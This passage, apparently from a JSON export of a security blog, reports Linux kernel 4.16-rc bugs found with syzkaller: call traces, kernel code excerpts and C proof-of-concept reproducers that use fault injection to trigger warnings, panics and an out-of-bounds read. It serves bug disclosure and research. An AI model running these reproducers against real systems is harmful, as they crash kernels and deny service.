1);\n\tif (write(fd, buf, strlen(buf)) != (ssize_t)strlen(buf))\n\t\texitf(\"failed to write /proc/thread-self/fail-nth\");\n\treturn fd;\n}\n\nvoid loop()\n{\n    *(uint64_t*)0x20000200 = 0;\n\tsyscall(__NR_set_mempolicy, 1, 0x20000200, 4);\n    memcpy((void*)0x20000040, \"/dev/ptmx\", 10);\n\twrite_file(\"/sys/kernel/debug/failslab/ignore-gfp-wait\", \"N\");\n\twrite_file(\"/sys/kernel/debug/fail_futex/ignore-private\", \"N\");\n\tinject_fault(5);\n\tsyscall(__NR_openat, 0xffffffffffffff9c, 0x20000040, 0, 0);\n}\n\nint main()\n{\n\tsyscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);\n\tloop();\n\treturn 0;\n}\n```\n\n**End**\n\n\n## tracepoint_probe_register_prio - warn\n\nGot from syzkaller & Found in *LK v4.16.0-rc5* with enabling ```CONFIG_FAULT_INJECTION```.\n\n### Call Trace (Dump)\n\n```c\nWARNING: CPU: 1 PID: 19167 at kernel/tracepoint.c:210 tracepoint_add_func kernel/tracepoint.c:210 [inline]\nWARNING: CPU: 1 PID: 19167 at kernel/tracepoint.c:210 tracepoint_probe_register_prio+0x11b/0x3a0 kernel/tracepoint.c:282\nKernel panic - not syncing: panic_on_warn set ...\n\nCPU: 1 PID: 19167 Comm: syz-executor6 Not tainted 4.16.0-rc5+ #12\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0xb9/0x11b lib/dump_stack.c:53\n panic+0x10a/0x2d6 kernel/panic.c:183\n __warn.cold.6+0x108/0x10f kernel/panic.c:547\nDumping ftrace buffer:\n   (ftrace buffer empty)\nKernel Offset: 0xf200000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\nRebooting in 86400 seconds..\n```\n\n### Code\n\nIn *kernel/tracepoint.c* at ```282 line```,\n\n```c\nint tracepoint_probe_register_prio(struct tracepoint *tp, void *probe,\n\t\t\t\t   void *data, int prio)\n{\n\tstruct tracepoint_func tp_func;\n\tint ret;\n\n\tmutex_lock(&tracepoints_mutex);\n\ttp_func.func = probe;\n\ttp_func.data = data;\n\ttp_func.prio = prio;\n\tret = tracepoint_add_func(tp, &tp_func, prio); // line 282\n\tmutex_unlock(&tracepoints_mutex);\n\treturn ret;\n}\n```\n\n```c\nstatic int tracepoint_add_func(struct tracepoint *tp,\n\t\t\t       struct tracepoint_func *func, int prio)\n{\n\tstruct tracepoint_func *old, *tp_funcs;\n\tint ret;\n\n\tif (tp->regfunc && !static_key_enabled(&tp->key)) {\n\t\tret = tp->regfunc();\n\t\tif (ret < 0)\n\t\t\treturn ret;\n\t}\n\n\ttp_funcs = rcu_dereference_protected(tp->funcs,\n\t\t\tlockdep_is_held(&tracepoints_mutex));\n\told = func_add(&tp_funcs, func, prio);\n\tif (IS_ERR(old)) {\n\t\tWARN_ON_ONCE(1);\n\t\treturn PTR_ERR(old);\n\t}\n\n\t/*\n\t * rcu_assign_pointer has as smp_store_release() which makes sure\n\t * that the new probe callbacks array is consistent before setting\n\t * a pointer to it.  This array is referenced by __DO_TRACE from\n\t * include/linux/tracepoint.h using rcu_dereference_sched().\n\t */\n\trcu_assign_pointer(tp->funcs, tp_funcs);\n\tif (!static_key_enabled(&tp->key))\n\t\tstatic_key_slow_inc(&tp->key);\n\trelease_probes(old);\n\treturn 0;\n}\n```\n\nFrom the *tracepoint_add_func*, there's a line that like this...\n\n```c\n    ...\n\ttp_funcs = rcu_dereference_protected(tp->funcs,\n\t\t\tlockdep_is_held(&tracepoints_mutex));\n\told = func_add(&tp_funcs, func, prio);\n\tif (IS_ERR(old)) {\n\t\tWARN_ON_ONCE(1); // <- here\n\t\treturn PTR_ERR(old);\n\t}\n\t...\n```\n\nSo the warning just happened... nothing more than else :)\n\n### PoC\n\n```c\n#define _GNU_SOURCE \n#include <endian.h>\n#include <sys/syscall.h>\n#include <unistd.h>\n#include <errno.h>\n#include <fcntl.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <sys/stat.h>\n\n__attribute__((noreturn)) static void doexit(int status)\n{\n\tvolatile unsigned i;\n\tsyscall(__NR_exit_group, status);\n\tfor (i = 0;; i++);\n}\n\n#include <stdint.h>\n#include <string.h>\n\nconst int kFailStatus = 67;\nconst int kRetryStatus = 69;\n\nstatic void exitf(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit(kRetryStatus);\n}\n\n#define BITMASK_LEN(type,bf_len) (type)((1ull << (bf_len)) - 1)\n\n#define BITMASK_LEN_OFF(type,bf_off,bf_len) (type)(BITMASK_LEN(type, (bf_len)) << (bf_off))\n\n#define STORE_BY_BITMASK(type,addr,val,bf_off,bf_len) if ((bf_off) == 0 && (bf_len) == 0) { *(type*)(addr) = (type)(val); } else { type new_val = *(type*)(addr); new_val &= ~BITMASK_LEN_OFF(type, (bf_off), (bf_len)); new_val |= ((type)(val)&BITMASK_LEN(type, (bf_len))) << (bf_off); *(type*)(addr) = new_val; }\n\nstatic bool write_file(const char* file, const char* what, ...)\n{\n\tchar buf[1024];\n\tva_list args;\n\tva_start(args, what);\n\tvsnprintf(buf, sizeof(buf), what, args);\n\tva_end(args);\n\tbuf[sizeof(buf) - 1] = 0;\n\tint len = strlen(buf);\n\n\tint fd = open(file, O_WRONLY | O_CLOEXEC);\n\tif (fd == -1)\n\t\treturn false;\n\tif (write(fd, buf, len) != len) {\n\t\tclose(fd);\n\t\treturn false;\n\t}\n\tclose(fd);\n\treturn true;\n}\n\nstatic int inject_fault(int nth)\n{\n\tint fd;\n\tchar buf[16];\n\n\tfd = open(\"/proc/thread-self/fail-nth\", O_RDWR);\n\tif (fd == -1)\n\t\texitf(\"failed to open /proc/thread-self/fail-nth\");\n\tsprintf(buf, \"%d\", nth + 1);\n\tif (write(fd, buf, strlen(buf)) != (ssize_t)strlen(buf))\n\t\texitf(\"failed to write /proc/thread-self/fail-nth\");\n\treturn fd;\n}\n\nvoid loop()\n{\n    *(uint64_t*)0x200000c0 = 0;\n\tsyscall(__NR_set_mempolicy, 1, 0x200000c0, 0x1f);\n\n    *(uint32_t*)0x20000180 = 2;\n    *(uint32_t*)0x20000184 = 0x78;\n    *(uint8_t*)0x20000188 = 0x2d;\n    *(uint8_t*)0x20000189 = 0;\n    *(uint8_t*)0x2000018a = 0;\n    *(uint8_t*)0x2000018b = 0;\n    *(uint32_t*)0x2000018c = 0;\n    *(uint64_t*)0x20000190 = 0;\n    *(uint64_t*)0x20000198 = 0x3e4;\n    *(uint64_t*)0x200001a0 = 0;\n    \n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 0, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 1, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 2, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 3, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 4, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 9, 5, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 6, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 7, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 8, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 9, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 10, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 11, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 12, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 13, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 14, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 15, 2);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 17, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 18, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 19, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 20, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 21, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 22, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 23, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 24, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 25, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 26, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 27, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 28, 1);\n    STORE_BY_BITMASK(uint64_t, 0x200001a8, 0, 29, 35);\n\n    *(uint32_t*)0x200001b0 = 0;\n    *(uint32_t*)0x200001b4 = 0;\n    *(uint64_t*)0x200001b8 = 0x20000100;\n    *(uint64_t*)0x200001c0 = 0;\n    *(uint64_t*)0x200001c8 = 0;\n    *(uint64_t*)0x200001d0 = 0;\n    *(uint64_t*)0x200001d8 = 0;\n    *(uint32_t*)0x200001e0 = 0;\n    *(uint64_t*)0x200001e8 = 0;\n    *(uint32_t*)0x200001f0 = 0;\n    *(uint16_t*)0x200001f4 = 0;\n    *(uint16_t*)0x200001f6 = 0;\n    \n    write_file(\"/sys/kernel/debug/failslab/ignore-gfp-wait\", \"N\");\n\twrite_file(\"/sys/kernel/debug/fail_futex/ignore-private\", \"N\");\n\tinject_fault(1);\n\tsyscall(__NR_perf_event_open, 0x20000180, 0, 0, -1, 0);\n}\n\nint main()\n{\n\tsyscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);\n\tloop();\n\treturn 0;\n}\n\n```\n\n**End**\n\n\n\n\n## tty_set_ldisc - warn\n\nGot from syzkaller & Found in *LK v4.16.0-rc5* with enabling ```CONFIG_FAULT_INJECTION```.\n\n### Call Trace (Dump)\n\n```c\nWARNING: CPU: 0 PID: 2567 at drivers/tty/tty_ldisc.c:531 tty_ldisc_restore drivers/tty/tty_ldisc.c:531 [inline]\nWARNING: CPU: 0 PID: 2567 at drivers/tty/tty_ldisc.c:531 tty_set_ldisc+0x1d6/0x2c0 drivers/tty/tty_ldisc.c:599\nKernel panic - not syncing: panic_on_warn set ...\n\nCPU: 0 PID: 2567 Comm: syz-executor0 Not tainted 4.16.0-rc5+ #12\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n __dump_stack lib/dump_stack.c:17 [inline]\n dump_stack+0xb9/0x11b lib/dump_stack.c:53\n panic+0x10a/0x2d6 kernel/panic.c:183\n __warn.cold.6+0x108/0x10f kernel/panic.c:547\nDumping ftrace buffer:\n   (ftrace buffer empty)\nKernel Offset: 0x26e00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\nRebooting in 86400 seconds..\n```\n\n### PoC\n\nThere's no reproducible code from syz-repro, but repro-log.\n\n```c\n# {Threaded:true Collide:false Repeat:false Procs:1 Sandbox:setuid Fault:true FaultCall:5 FaultNth:1 EnableTun:true UseTmpDir:true HandleSegv:true WaitRepeat:false Debug:false Repro:false}\nr0 = openat$ptmx(0xffffffffffffff9c, &(0x7f0000000180)='/dev/ptmx\\x00', 0x0, 0x0)\nioctl$TCXONC(r0, 0x40045431, 0x6f7000)\npoll(&(0x7f0000000080)=[{r0}], 0x1, 0x80000000)\nioctl$TIOCPKT(r0, 0x5420, &(0x7f0000000040)=0x7)\nr1 = syz_open_pts(r0, 0x0)\nioctl$TIOCSETD(r1, 0x5423, &(0x7f0000000000)=0x2)\n```\n\n**End**\n","excerpt":"sctp_id2assoc - use after free Read Found in LK v4.16.0-rc4. Maybe it could be useful :) Call Trace (Dump) End init_tty - kernel panic Got …","fields":{"slug":"/2018-03-2-Founds/"},"frontmatter":{"date":"Mar 11, 2018","title":"Linux Kernel - 2018-03-2 Founds","tags":["Security","Linux-Kernel"],"update":"Mar 13, 2018"},"timeToRead":16}},{"node":{"rawMarkdownBody":"\n## handle_irq - OOBs\n\n### Call Trace (Dump)\n\n```c\nBUG: KASAN: alloca-out-of-bounds in handle_irq+0x218/0x2f3\nRead of size 8 at addr ffff88007b086240 by task syzkaller734473/2831\n\nCPU: 0 PID: 2831 Comm: syzkaller734473 Not tainted 4.16.0-rc3+ #2\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n <IRQ>\n dump_stack+0x127/0x213\n print_address_description+0x60/0x22b\n kasan_report.cold.6+0xac/0x2f4\n </IRQ>\n\nThe buggy address belongs to the page:\npage:ffffea0001ec2180 count:0 mapcount:0 mapping:0000000000000000 index:0xffff88007b087dd0\nflags: 0x500000000000000()\nraw: 0500000000000000 0000000000000000 ffff88007b087dd0 00000000ffffffff\nraw: 0000000000000000 dead000000000200 0000000000000000 0000000000000000\npage dumped because: kasan: bad access detected\n\nMemory state around the buggy address:\n ffff88007b086100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n ffff88007b086180: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n>ffff88007b086200: 00 00 00 00 00 00 00 00 cb cb cb cb 00 00 00 00\n                                           ^\n ffff88007b086280: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00\n ffff88007b086300: 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2 00 00 00\n==================================================================\nKernel panic - not syncing: panic_on_warn set ...\n\nCPU: 0 PID: 2831 Comm: syzkaller734473 Tainted: G    B            4.16.0-rc3+ #2\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nCall Trace:\n <IRQ>\n dump_stack+0x127/0x213\n panic+0x1f8/0x46f\n kasan_end_report+0x43/0x49\n kasan_report.cold.6+0xc8/0x2f4\n </IRQ>\nDumping ftrace buffer:\n   (ftrace buffer empty)\nKernel Offset: 0x26800000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)\nRebooting in 86400 seconds..\n```\n\n### PoC\n\n```c\n#define _GNU_SOURCE\n\n#include <endian.h>\n#include <sys/syscall.h>\n#include <unistd.h>\n#include <errno.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <sys/time.h>\n#include <sys/wait.h>\n#include <time.h>\n#include <sys/prctl.h>\n#include <dirent.h>\n#include <sys/mount.h>\n#include <errno.h>\n#include <sched.h>\n#include <signal.h>\n#include <stdarg.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <sys/prctl.h>\n#include <sys/resource.h>\n#include <sys/time.h>\n#include <sys/wait.h>\n#include <linux/net.h>\n#include <netinet/in.h>\n#include <sys/socket.h>\n\n__attribute__((noreturn)) static void doexit(int status)\n{\n\tvolatile unsigned i;\n\tsyscall(__NR_exit_group, status);\n\tfor (i = 0;; i++) {\n\t}\n}\n#include <stdint.h>\n#include <string.h>\n#include <errno.h>\n#include <stdarg.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/stat.h>\n\nconst int kFailStatus = 67;\nconst int kRetryStatus = 69;\n\n  static void fail(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit((e == ENOMEM || e == EAGAIN) ? kRetryStatus : kFailStatus);\n}\n\n  static void exitf(const char* msg, ...)\n{\n\tint e = errno;\n\tva_list args;\n\tva_start(args, msg);\n\tvfprintf(stderr, msg, args);\n\tva_end(args);\n\tfprintf(stderr, \" (errno %d)\\n\", e);\n\tdoexit(kRetryStatus);\n}\n\nstatic uint64_t current_time_ms()\n{\n\tstruct timespec ts;\n\n\tif (clock_gettime(CLOCK_MONOTONIC, &ts))\n\t\tfail(\"clock_gettime failed\");\n\treturn (uint64_t)ts.tv_sec * 1000 + (uint64_t)ts.tv_nsec / 1000000;\n}\n\nstatic void use_temporary_dir()\n{\n\tchar tmpdir_template[] = \"./syzkaller.XXXXXX\";\n\tchar* tmpdir = mkdtemp(tmpdir_template);\n\tif (!tmpdir)\n\t\tfail(\"failed to mkdtemp\");\n\tif (chmod(tmpdir, 0777))\n\t\tfail(\"failed to chmod\");\n\tif (chdir(tmpdir))\n\t\tfail(\"failed to chdir\");\n}\n\nstatic void loop();\n\nstatic void sandbox_common()\n{\n\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\n\tsetpgrp();\n\tsetsid();\n\n\tstruct rlimit rlim;\n\trlim.rlim_cur = rlim.rlim_max = 128 << 20;\n\tsetrlimit(RLIMIT_AS, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 8 << 20;\n\tsetrlimit(RLIMIT_MEMLOCK, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 1 << 20;\n\tsetrlimit(RLIMIT_FSIZE, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 1 << 20;\n\tsetrlimit(RLIMIT_STACK, &rlim);\n\trlim.rlim_cur = rlim.rlim_max = 0;\n\tsetrlimit(RLIMIT_CORE, &rlim);\n\n#define CLONE_NEWCGROUP 0x02000000\n\n\tif (unshare(CLONE_NEWNS)) {\n\t}\n\tif (unshare(CLONE_NEWIPC)) {\n\t}\n\tif (unshare(CLONE_NEWCGROUP)) {\n\t}\n\tif (unshare(CLONE_NEWUTS)) {\n\t}\n\tif (unshare(CLONE_SYSVSEM)) {\n\t}\n}\n\nstatic int do_sandbox_none(void)\n{\n\tif (unshare(CLONE_NEWPID)) {\n\t}\n\tint pid = fork();\n\tif (pid < 0)\n\t\tfail(\"sandbox fork failed\");\n\tif (pid)\n\t\treturn pid;\n\n\tsandbox_common();\n\tif (unshare(CLONE_NEWNET)) {\n\t}\n\n\tloop();\n\tdoexit(1);\n}\n\n#define XT_TABLE_SIZE 1536\n#define XT_MAX_ENTRIES 10\n\nstruct xt_counters {\n\tuint64_t pcnt, bcnt;\n};\n\nstruct ipt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct ipt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct ipt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct ipt_table_desc {\n\tconst char* name;\n\tstruct ipt_getinfo info;\n\tstruct ipt_replace replace;\n};\n\nstatic struct ipt_table_desc ipv4_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\nstatic struct ipt_table_desc ipv6_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\n#define IPT_BASE_CTL 64\n#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)\n#define IPT_SO_GET_INFO (IPT_BASE_CTL)\n#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)\n\nstruct arpt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct arpt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct arpt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct arpt_table_desc {\n\tconst char* name;\n\tstruct arpt_getinfo info;\n\tstruct arpt_replace replace;\n};\n\nstatic struct arpt_table_desc arpt_tables[] = {\n    {.name = \"filter\"},\n};\n\n#define ARPT_BASE_CTL 96\n#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)\n#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)\n#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)\n\nstatic void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct ipt_get_entries entries;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct ipt_get_entries entries;\n\tstruct ipt_getinfo info;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(IPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_arptables(void)\n{\n\tstruct arpt_get_entries entries;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_arptables()\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct arpt_get_entries entries;\n\tstruct arpt_getinfo info;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(ARPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n#include <linux/if.h>\n#include <linux/netfilter_bridge/ebtables.h>\n\nstruct ebt_table_desc {\n\tconst char* name;\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstatic struct ebt_table_desc ebt_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"broute\"},\n};\n\nstatic void checkpoint_ebtables(void)\n{\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) 